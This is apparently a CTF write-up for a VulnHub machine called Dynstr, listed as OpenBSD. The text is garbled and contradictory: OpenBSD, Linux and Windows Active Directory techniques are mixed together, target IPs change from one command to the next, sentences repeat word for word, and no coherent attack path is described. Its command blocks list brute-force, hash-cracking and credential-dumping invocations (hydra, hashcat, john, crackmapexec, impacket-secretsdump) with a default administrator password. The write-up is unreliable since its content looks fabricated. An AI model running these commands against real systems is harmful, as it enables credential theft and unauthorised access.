---
TitleSEO: "VulnHub — Dynstr (Easy OpenBSD) | ZureFX"
TitlePost: "VulnHub — Dynstr (Easy OpenBSD)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Dynstr. AlwaysInstallElevated and AS-REP Roasting to achieve easy compromise on OpenBSD."
Keywords: "easy, linux, reversing"
URL: "https://zurefx.github.io/writeups/htb-dynstr-973.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-dynstr-973/"
Date: "2024-08-24"
Tags: "Easy, Linux, Reversing"
Section: "writeups"
Lang: "en"
main_img: "htb-dynstr-973"
Permalink: "/writeups/htb-dynstr-973.html"
BtnLabel: "Read Writeup"
Pick: 1
---
## Machine Info

### Overview

The target **Dynstr** is rated **Easy** on VulnHub. It runs **OpenBSD** and the IP address during this analysis was `10.99.3.120`.

### Objectives

Initial enumeration revealed several interesting open ports on the target. The application stored sensitive credentials in an unencrypted configuration file.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
nmap -sCV -p135,1433,9200 10.79.188.8 -oN scan.txt
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.84.105.118 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.41.30.34 -u administrator -p 'P@ssw0rd!' --shares
nmap -sCV -p139,27017,25 10.37.208.137 -oN scan.txt
```

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files.

### Service Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. Authentication bypass was achieved through careful manipulation of the login mechanism. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.106.95.45 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
nmap -sCV -p389,110,110 10.42.44.135 -oN scan.txt
```

The database credentials were hardcoded in the application source code. Token impersonation allowed elevation to SYSTEM privileges on the target.

### SMB Enumeration

The database credentials were hardcoded in the application source code. The database credentials were hardcoded in the application source code.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.122.114.157/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.102.196.76
```

Command injection was possible through unsanitized user input in the search functionality. Command injection was possible through unsanitized user input in the search functionality. The service was running without proper input validation, leading to injection vulnerabilities.

## Exploitation

### Vulnerability Identification

Weak file permissions allowed modification of critical system files. The service account had excessive permissions assigned in Active Directory. The target system was identified as running a vulnerable version of the service.

Key finding: **AlwaysInstallElevated**.

The backup files contained sensitive information that should not have been accessible. Token impersonation allowed elevation to SYSTEM privileges on the target.

### Initial Access

Unconstrained delegation was enabled on the compromised machine. Lateral movement was facilitated by reusing discovered credentials across services.

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
crackmapexec smb 10.22.109.194 -u administrator -p 'P@ssw0rd!' --shares
```

Privilege escalation was possible due to misconfigured sudo permissions. The backup files contained sensitive information that should not have been accessible. The web application was vulnerable to Server-Side Template Injection (SSTI).

## Privilege Escalation

### Enumeration

The web application was vulnerable to Server-Side Template Injection (SSTI). The backup files contained sensitive information that should not have been accessible. The application stored sensitive credentials in an unencrypted configuration file.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.72.118.53 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
gobuster dir -u http://10.101.148.200/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
impacket-secretsdump administrator:'P@ssw0rd!'@10.118.111.233
feroxbuster -h
```

### Exploitation

Command injection was possible through unsanitized user input in the search functionality. The target system was identified as running a vulnerable version of the service.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.92.158.201 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
crackmapexec smb 10.72.214.130 -u administrator -p 'P@ssw0rd!' --shares
```

The application stored sensitive credentials in an unencrypted configuration file. The scheduled task ran with elevated privileges and could be abused for escalation.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The kernel version was outdated and vulnerable to a publicly known exploit. The service was running without proper input validation, leading to injection vulnerabilities.

## Summary

### Tools Used

- `secretsdump`
- `socat`
- `gobuster`
- `sharphound`

### Key Takeaways

- AlwaysInstallElevated
- AS-REP Roasting
